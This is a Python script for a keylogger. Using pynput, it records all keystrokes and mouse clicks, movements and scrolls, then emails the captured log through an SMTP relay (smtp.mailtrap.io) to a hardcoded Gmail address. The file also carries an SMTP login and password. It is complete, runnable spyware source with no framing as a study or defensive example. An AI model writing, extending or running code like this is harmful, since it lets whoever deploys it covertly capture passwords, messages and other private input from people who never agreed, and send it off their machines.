import time
from pynput import keyboard, mouse
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.log = ""
        self.mouse_log = ""
        self.keyboard_log = []
        self.email = "redred1234p@gmail.com"  # Replace with your email
        self.password = "ad7337a8277ee1"  # Replace with your password (use the Mailtrap SMTP password)
        self.smtp_server = "smtp.mailtrap.io"
        self.smtp_port = 587
        self.to_email = "redred1234p@gmail.com"  # Replace with your receiver email
        self.subject = "Keylogger Report"
        self.filename = "keylogger_log.txt"

    def save_data(self, key):
        try:
            if isinstance(key, keyboard.KeyCode):
                self.keyboard_log.append(key.char)
            else:
                self.keyboard_log.append(str(key))
            print(f"Key pressed: {key}")  # Debugging statement
        except Exception as e:
            print(f"Error capturing key: {e}")  # Debugging statement

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.mouse_log += f"Mouse clicked at ({x}, {y}) with {button}\n"
            print(f"Mouse clicked at ({x}, {y}) with {button}")  # Debugging statement

    def on_move(self, x, y):
        self.mouse_log += f"Mouse moved to ({x}, {y})\n"
        print(f"Mouse moved to ({x}, {y})")  # Debugging statement

    def on_scroll(self, x, y, dx, dy):
        self.mouse_log += f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n"
        print(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})")  # Debugging statement

    def report(self):
        print("Generating report...")  # Debugging statement
        if self.keyboard_log or self.mouse_log:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            body = f"Report generated at {current_time}\n\nKey Events:\n"
            body += "".join(self.keyboard_log) + "\n\nMouse Events:\n" + self.mouse_log
            self.send_email(body)
        else:
            print("No data to report.")  # Debugging statement

    def send_email(self, body):
        try:
            print("Preparing to send email...")  # Debugging statement
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.to_email
            msg['Subject'] = self.subject
            msg.attach(MIMEText(body, 'plain'))

            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.to_email, msg.as_string())
            server.quit()
            print("Email sent successfully!")  # Debugging statement
        except Exception as e:
            print(f"Failed to send email: {e}")  # Debugging statement

    def run(self):
        print("Keylogger is running...")  # Debugging statement
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        mouse_listener = mouse.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)

        # Start keyboard listener
        with keyboard_listener:
            print("Keyboard listener started.")  # Debugging statement
            keyboard_listener.join()

        # Start mouse listener
        with mouse_listener:
            print("Mouse listener started.")  # Debugging statement
            mouse_listener.join()

        # Generate and send the report
        self.report()

# Start the keylogger
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()
